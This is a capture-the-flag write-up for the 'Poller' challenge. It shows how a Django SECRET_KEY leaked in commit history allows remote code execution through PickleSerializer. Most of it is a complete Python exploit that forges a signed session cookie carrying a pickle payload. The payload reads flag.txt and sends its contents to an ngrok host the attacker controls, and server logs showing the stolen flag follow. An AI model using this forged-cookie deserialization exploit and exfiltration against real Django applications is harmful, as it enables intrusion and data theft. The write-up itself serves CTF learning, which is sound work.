## Poller:

_Have your say! Poller is the place where all the important infosec questions are asked._

-------

there is a github link in cource code: https://github.com/congon4tor/poller 

from looking at commit we know this is vulnerable to django PickleSerializer RCE and we also 
found secret_key in previous commits there is also one fake key 

SECRET_KEY = `77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!`

we can get the revese shell here but i don't have vps so we go the easy way we know the file name is flag.txt
first i created local server with python : `python -m http.server 80`

and expose it to internet with ngrok : `ngrok http 80`

now we craft our payload in a way that it will read file content and make a request 
to our server with that file content in GET request here is final exploit in python :

```python
from django.conf import settings as _settings
from django.core.signing import loads, dumps
from django.contrib.sessions.serializers import PickleSerializer
from urllib.request import urlopen
import os
from sys import argv


class Rce():
    def __reduce__(self):
        import requests
        return (exec,("import requests;s = 'n=1&s=' + open('flag.txt').read();requests.get(f'https://669d-49-34-53-197.in.ngrok.io/hello?{s}');import time;time.sleep(13)",))
        # return exec(f'import time;time.sleep(99)')


SECRET_KEY = '77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!'
salt = 'django.contrib.sessions.backends.signed_cookies'
c_url = 'http://challenge.nahamcon.com:31050/'
cookie = '.eJxNjE0KwjAUhHXhUgRPoZuQ5DWa7MS9Zwj5ebFVaaBpl4IHyDKewytaUaGzGZjvYx6L52v2zb1s8lKboa_1kLDTjS95DiWvJ5s17ortCLb-YtpzJC62fddY8lHIjyZyih5vx7-7mhzUJtUlHwRF9JRKxZgNyqFHIYKUY1dMAefAg6IIaLiVogK2d0h3gJXlAQ04VgbyBgKeP5Q:1nlwXO:fHckutyzxCaT3Hb8w56AHnlhu2_4UmbA7rvjo4tKU7s'
_settings.configure()
content = loads(cookie, key=SECRET_KEY, serializer=PickleSerializer, salt=salt)
print(content)
content['testcookie'] = Rce()
cookie = dumps(content, key=SECRET_KEY, serializer=PickleSerializer, salt=salt, compress=True)

import requests

c_cookie = {'csrftoken': 'LUQMdTVnStctjS2xxyX8wGl9CfUHyPiROjEjjlsVFgd0a3MhpJg9XCEAIxTJupw4', 'sessionid': cookie}
print(c_cookie)
r = requests.get(c_url, cookies=c_cookie)
print(r.headers)
```

we can see our flag in python server we created :

```shell
127.0.0.1 - - [06/May/2022 09:24:27] "GET /hello?n=1&s=flag%7Ba6b902e045b669148b5e92f771a68d39%7D HTTP/1.1" 200 -
127.0.0.1 - - [06/May/2022 09:24:42] "GET /hello?n=1&s=flag%7Ba6b902e045b669148b5e92f771a68d39%7D HTTP/1.1" 200 -
```

```
flag{a6b902e045b669148b5e92f771a68d39}
```
